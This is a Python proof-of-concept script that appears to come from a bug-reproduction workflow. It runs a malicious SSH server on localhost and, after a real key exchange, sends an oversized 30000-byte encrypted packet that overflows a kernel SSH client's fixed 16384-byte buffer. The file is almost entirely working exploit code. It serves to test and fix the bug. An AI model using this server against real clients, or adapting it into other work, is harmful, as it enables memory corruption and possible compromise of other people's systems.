#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 cubestudio-dev <cubestudio@qq.com>
"""P0fix1 paramiko-based hostile SSH server (A14-07: BUG-0013).

Performs a REAL key exchange with the kernel SSH client (so both sides hold
session keys), then -- as soon as the client's first auth request arrives
(NEWKEYS active) -- sends a 30000-byte encrypted application packet. The
kernel client reads `remaining + mac_size` bytes into rest_buf[16384]
without any bounds check -> ~13.6KB heap/physical overflow.

Usage: python3 tools/p0_paramiko_evil.py --port 2246
"""
import argparse
import socket
import sys
import threading
import time

import paramiko


class EvilServerInterface(paramiko.ServerInterface):
    def __init__(self, evil_fn):
        self.evil_fn = evil_fn
        self.fired = False

    def check_auth_none(self, username):
        self._fire()
        return paramiko.AUTH_FAILED

    def check_auth_password(self, username, password):
        self._fire()
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "none,password,publickey"

    def _fire(self):
        if self.fired:
            return
        self.fired = True
        try:
            from paramiko.message import Message
            payload = b"\x63" + b"\x00" * 30000
            self.evil_fn(Message(payload))
            print("[evil-paramiko] sent 30000B encrypted message", flush=True)
        except Exception as e:  # noqa
            print(f"[evil-paramiko] send failed: {e!r}", flush=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    args = ap.parse_args()

    host_key = paramiko.RSAKey.generate(2048)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", args.port))
    sock.listen(1)
    sock.settimeout(120)
    print(f"[evil-paramiko] listening on 127.0.0.1:{args.port}", flush=True)
    conn, addr = sock.accept()
    print(f"[evil-paramiko] connection from {addr}", flush=True)

    t = paramiko.Transport(conn)
    iface = EvilServerInterface(lambda m: t.packetizer.send_message(m))
    t.add_server_key(host_key)
    t.start_server(server=iface)
    # wait for the client to process the hostile packet
    deadline = time.time() + 60
    while t.is_active() and time.time() < deadline:
        time.sleep(1)
    try:
        t.close()
    except Exception:  # noqa
        pass
    print("[evil-paramiko] done", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
